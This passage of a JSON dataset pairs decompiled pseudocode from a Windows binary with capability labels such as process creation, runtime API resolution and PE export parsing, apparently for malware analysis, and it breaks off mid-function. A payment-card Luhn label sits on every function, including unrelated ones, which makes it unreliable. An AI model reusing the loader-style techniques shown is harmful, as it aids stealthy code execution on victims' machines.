            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b588(int16_t *param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint16_t *puVar4;\n    int16_t iVar5;\n    int16_t aiStack44 [16];\n    \n    iVar5 = 0;\n    iVar2 = 1;\n    piVar3 = aiStack44;\n    do {\n        piVar3 = piVar3 + 1;\n        iVar5 = (*param_1 + iVar5) * 2;\n        *piVar3 = iVar5;\n        iVar2 = iVar2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar2 < 0x10);\n    iVar2 = 0;\n    puVar4 = in_EAX + 2;\n    if (-1 < param_2) {\n        do {\n            if (*puVar4 != 0) {\n                aiStack44[*puVar4] = aiStack44[*puVar4] + 1;\n                uVar1 = fcn.0046ce64();\n                puVar4[-1] = uVar1;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 2;\n        } while (iVar2 <= param_2);\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "0046d488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0046d488(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x46d49e;\n    fcn.004059cc();\n    uStack20 = 0x46d4f5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x46d514, 0x46d50c, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x46d4fc);\n    return;\n}\n",
        "token_count": 236
    },
    "0046dafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0046dafc(void)\n\n{\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0x10;\n    sub.kernel32.dll_GetComputerNameA(auStack24, &uStack28);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 69
    },
    "0046e50c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e50c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint pszPath;\n    uint pidl;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    puStack312 = 0x46e541;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack312 = 0x46e549;\n    fcn.004059cc();\n    puStack312 = 0x46e551;\n    fcn.004059cc();\n    uStack316 = 0x46e67a;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack312 = &stack0xfffffffc;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0, 0x10, &fcn.0046e50c::pidl);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(pidl, &fcn.0046e50c::pszPath);\n        fcn.0042bdf0();\n        fcn.00407050();\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x1c))(var_14h, uVar2);\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x50))(var_14h, uVar2);\n        (**(*var_14h + 0x3c))(var_14h, 5);\n        fcn.004057a0();\n        fcn.004058e0(0x46e6ac, var_8h, 0x46e6a0, 0);\n        uVar2 = fcn.0040646c(0xffffffff);\n        fcn.00407050(uVar2);\n        (**(_pe_dos_header + 0x18))(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040700c(0x46e681);\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 606
    },
    "0046e8fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid fcn.0046e8fc(void)\n\n{\n    int32_t iVar1;\n    char *in_EAX;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStackY144;\n    uint uStackY140;\n    uint uVar2;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *in_EAX = *in_EAX + in_EAX;\n    do {\n        fcn.00405728();\n        fcn.00405818();\n        fcn.00409e64(*(*(unaff_EBP + -0xc) + 4));\n        fcn.004058e0();\n        fcn.00405728();\n        fcn.004058e0();\n        fcn.00409e64(*(*(unaff_EBP + -0xc) + 0xc));\n        fcn.004058e0();\n        fcn.00409e64(*(*(unaff_EBP + -0xc) + 0x10));\n        fcn.004058e0();\n        fcn.00409e64(*(*(unaff_EBP + -0xc) + 0x14));\n        fcn.004058e0();\n        fcn.00405728();\n        fcn.004058e0();\n        fcn.00405728();\n        fcn.004058e0();\n        fcn.00409e64(*(*(unaff_EBP + -0xc) + 0x20));\n        uStackY140 = 0x46eac4;\n        uStackY144 = 0x46ea4e;\n        fcn.004058e0();\n        do {\n            uStackY144 = *(unaff_EBP + -0xc);\n            sub.netapi32.dll_NetApiBufferFree();\n            *in_FS_OFFSET = uStackY144;\n            unaff_ESI = unaff_ESI + -1;\n            if (unaff_ESI == 0) {\n                uVar2 = *(unaff_EBP + -8);\n                uStackY140 = 0x46ea85;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = uVar2;\n                fcn.00405554();\n                return;\n            }\n            uStackY140 = 0x46ea61;\n            uStackY144 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff70;\n            iVar1 = sub.netapi32.dll_NetShareGetInfo();\n        } while (iVar1 != 0);\n    } while( true );\n}\n",
        "token_count": 679
    },
    "0046eb14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046eb14(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46eb2d;\n    fcn.004059cc();\n    puStack28 = 0x46eb35;\n    fcn.004059cc();\n    uStack32 = 0x46ebc4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421670();\n    piVar1 = fcn.00404620();\n    fcn.00409ee4();\n    fcn.0046eac8();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421d84();\n    (**(*piVar1 + 0x1c))();\n    fcn.0042171c();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46ebcb;\n    uStack32 = 0x46ebc3;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 305
    },
    "0046efb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046efb4(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46efcb;\n    fcn.004059cc();\n    puStack24 = 0x46efd3;\n    fcn.004059cc();\n    puStack24 = 0x46efdb;\n    fcn.004059cc();\n    puStack24 = 0x46efe3;\n    fcn.004059cc();\n    uStack28 = 0x46f08f;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46effd;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421670();\n    puStack36 = 0x46f008;\n    fcn.00409ee4();\n    puStack36 = 0x46f00d;\n    fcn.0046eac8();\n    uStack40 = 0x46f065;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00409ee4();\n    fcn.0042208c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46f06c;\n    uStack40 = 0x46f05c;\n    fcn.0042171c();\n    uStack40 = 0x46f064;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 437
    },
    "0046f09c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f09c(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46f0b3;\n    fcn.004059cc();\n    puStack24 = 0x46f0bb;\n    fcn.004059cc();\n    puStack24 = 0x46f0c3;\n    fcn.004059cc();\n    puStack24 = 0x46f0cb;\n    fcn.004059cc();\n    uStack28 = 0x46f170;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46f0e5;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421670();\n    puStack36 = 0x46f0f0;\n    fcn.00409ee4();\n    puStack36 = 0x46f0f5;\n    fcn.0046eac8();\n    uStack40 = 0x46f146;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421fe4();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46f14d;\n    uStack40 = 0x46f13d;\n    fcn.0042171c();\n    uStack40 = 0x46f145;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 438
    },
    "0046f180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f180(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46f197;\n    fcn.004059cc();\n    puStack24 = 0x46f19f;\n    fcn.004059cc();\n    puStack24 = 0x46f1a7;\n    fcn.004059cc();\n    puStack24 = 0x46f1af;\n    fcn.004059cc();\n    uStack28 = 0x46f254;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46f1c9;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421670();\n    puStack36 = 0x46f1d4;\n    fcn.00409ee4();\n    puStack36 = 0x46f1d9;\n    fcn.0046eac8();\n    uStack40 = 0x46f22a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421fb4();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46f231;\n    uStack40 = 0x46f221;\n    fcn.0042171c();\n    uStack40 = 0x46f229;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 434
    },
    "0047002c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047002c(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x470045;\n    fcn.004059cc();\n    puStack28 = 0x47004d;\n    fcn.004059cc();\n    puStack28 = 0x470055;\n    fcn.004059cc();\n    uStack32 = 0x4700de;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421670();\n    bVar1 = true;\n    fcn.00405974();\n    if (!bVar1) {\n        fcn.00405974();\n    }\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421cfc();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4700e5;\n    uStack32 = 0x4700dd;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 289
    },
    "004708a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.004708a0(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x4708ba;\n    fcn.004059cc();\n    var_10h = 0x4709d5;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004708a0::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea60(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_8h, 0x4709e0, var_ch);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x4709dc);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 596
    },
    "004709ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.004709ec(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x470a06;\n    fcn.004059cc();\n    var_10h = 0x470b1f;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004709ec::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea60(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x470b2c, 0xffffffff);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x470b26);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 593
    },
    "00470b38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00470b38(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x470b52;\n    fcn.004059cc();\n    var_10h = 0x470c6b;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00470b38::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea60(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea60(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x470c78, 0);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x470c72);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 593
    },
    "004713c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004713c0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4713da;\n    fcn.004059cc();\n    uStack28 = 0x47144e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00405864();\n    fcn.00421890();\n    fcn.00422014();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x471455;\n    uStack28 = 0x47144d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 213
    },
    "00472a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472a90(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x472aa9;\n    fcn.004059cc();\n    uStack24 = 0x472aec;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040a5a8(param_2);\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack28 = 0x472af3;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 204
    },
    "00473a68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00473a68(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.004057a0();\n    }\n    else {\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00473e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00473e9c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int16_t iVar3;\n    \n    iVar1 = *(in_EAX + 0x3c);\n    uVar2 = fcn.00402f00();\n    fcn.00403af4();\n    fcn.00408568();\n    iVar3 = *(iVar1 + in_EAX + 6);\n    do {\n        fcn.00408568();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return CONCAT44(in_EAX, uVar2);\n}\n",
        "token_count": 146
    },
    "00474fa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00474fa8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_84h;\n    uint var_80h;\n    uint var_6ch;\n    uint uStack108;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack208 = 0x474fc6;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack208 = 0x474fce;\n    fcn.004059cc();\n    uStack212 = 0x47526e;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff28;\n    puStack208 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_b0h = 0x44;\n    var_84h = 1;\n    var_80h._0_2_ = 0;\n    uVar2 = fcn.004059dc(0, 0, 0, 0x8000000, 0, 0, &fcn.00474fa8::var_b0h, &fcn.00474fa8::var_c0h);\n    sub.kernel32.dll_CreateProcessA(0, uVar2);\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        fcn.004055c8();\n    }\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        fcn.0040f23c();\n    }\n    fcn.004055c8();\n    uStack68 = fcn.00474d80();\n    uStack64 = fcn.00474d80();\n    uStack60 = fcn.00474d80();\n    uStack56 = fcn.00474d80();\n    uStack52 = fcn.00474d80();\n    uStack48 = fcn.00474d80();\n    uStack44 = fcn.00474d80();\n    uStack40 = fcn.00474d80();\n    uStack28 = fcn.00474d80();\n    uStack36 = fcn.00474d80();\n    uStack32 = fcn.00474d80();\n    fcn.004059dc();\n    uStack20 = fcn.00474d80();\n    uStack24 = var_b8h;\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x475324);\n    var_6ch = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x475340);\n    uStack108 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752a8);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752b0);\n    uStack100 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752bc);\n    uStack96 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752c8);\n    uStack92 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752d4);\n    uStack88 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752e4);\n    uStack84 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x4752f8);\n    uStack80 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x475304);\n    uStack76 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x475334, 0x475310);\n    uStack72 = sub.kernel32.dll_GetProcAddress_1(uVar2);\n    uVar2 = 0;\n    fcn.00474e48(0, 0x60);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x475275);\n    return;\n}\n",
        "token_count": 1285
    },
    "00475350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475350(code **arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_54h;\n    uint var_44h;\n    \n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x10]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[3] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xf], arg_8h[0x11]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[2] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x15]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[5] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x16]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[6] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x12]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[4] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x13]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[7] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x14]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xd] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x18]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xb] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1b]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[10] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1a]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[0xc] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x19]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[8] = pcVar2;\n    uVar1 = (**arg_8h)(arg_8h[0xe], arg_8h[0x1c]);\n    pcVar2 = (*arg_8h[1])(uVar1);\n    arg_8h[9] = pcVar2;\n    (*arg_8h[7])(0);\n    (*arg_8h[0xd])(0, 0, arg_8h[0x1e]);\n    iVar3 = (*arg_8h[4])();\n    if ((iVar3 == 0xb7) && (iVar3 = (*arg_8h[9])(1, 0, arg_8h[0x1f]),  iVar3 != 0)) {\n        (*arg_8h[0xc])(iVar3);\n        